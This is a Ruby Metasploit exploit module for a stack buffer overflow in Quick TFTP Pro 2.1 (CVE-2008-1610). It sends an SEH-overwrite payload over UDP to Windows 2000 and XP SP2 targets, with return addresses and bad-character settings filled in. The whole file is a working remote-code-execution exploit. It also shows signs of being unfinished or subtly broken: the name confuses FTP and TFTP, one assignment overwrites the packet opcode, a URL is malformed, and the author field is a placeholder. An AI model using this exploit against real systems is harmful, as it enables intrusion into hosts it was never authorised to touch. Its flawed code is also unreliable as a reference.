##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Quick FTP Pro 2.1 Long Mode Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in the Quick TFTP Pro 2.1
      },
      'Author'         => 'Your Name',
      'Version'	       => '$Revision: 7724 $',
      'References'     =>
        [
          ['CVE', '2008-1610'],
          ['OSVDB', '43784'],
          ['BID', '28459'],
          #['URL', 'http://secunia.com/advisories/29494'],
	  ['URL', 'http://www.exploit-db/exploits/5315/'],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 412,
          'BadChars' => "\x00\x20\x0a\x0d",
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows Server 2000', { 'Ret' => 0x75022AC4} ], #ws2help.dll
          ['Windows XP SP2', {'Ret' => 0x74D31458} ],       #oledlg.dll
          #['Windows XP SP2', {'Ret' => 0x41414141} ],     
        ],
      'Privileged'     => true,
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar 3 2008'))

    register_options(
      [
        Opt::RPORT(69)
      ], self.class)

  end

  def exploit
    connect_udp

    print_status("Trying target #{target.name}...")

    #evil = "\x41"*1019 
    #evil << "\xeb\x08\x90\x90"
    #evil << "\x67\x15\xd3\x74"
    #evil << "\x90" * 16
    #evil << "\xcc" * 412
    #sploit = "\x00\x02"
    #sploit = "pwnd"
    #sploit << "\x00"
    #sploit << evil
    #sploit << "\x00"
    
    evil  = rand_text_alpha_upper(1019)
    evil << generate_seh_payload(target.ret)
    evil << make_nops(16)
    
    print_line(evil)
     
    sploit  = "\x00\x02"
    sploit  = "pwnd"
    sploit << "\x00"
    sploit << evil
    sploit << "\x00"


    udp_sock.put(sploit)
    print_status("Done.")
    
    disconnect_udp
  end
end
